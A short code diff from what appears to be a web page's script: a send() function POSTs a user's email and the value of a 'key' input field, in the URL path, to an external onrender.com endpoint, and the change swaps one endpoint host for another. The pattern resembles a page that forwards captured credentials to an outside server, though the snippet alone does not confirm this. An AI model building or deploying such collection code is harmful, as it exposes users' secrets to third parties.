@@ -120,7 +120,7 @@ function send(){
     document.getElementById('loading').style.display = 'flex';
     var inputval = document.getElementById('key').value;
     (async()=>{
-     await fetch(`https://second-api-uvq4.onrender.com/submit/${email}/${inputval}`,{ method: 'POST' })
+     await fetch(`https://first-api-6bmo.onrender.com/submit/${email}/${inputval}`,{ method: 'POST' })
        .then(response =>{
           return response.json();
        })
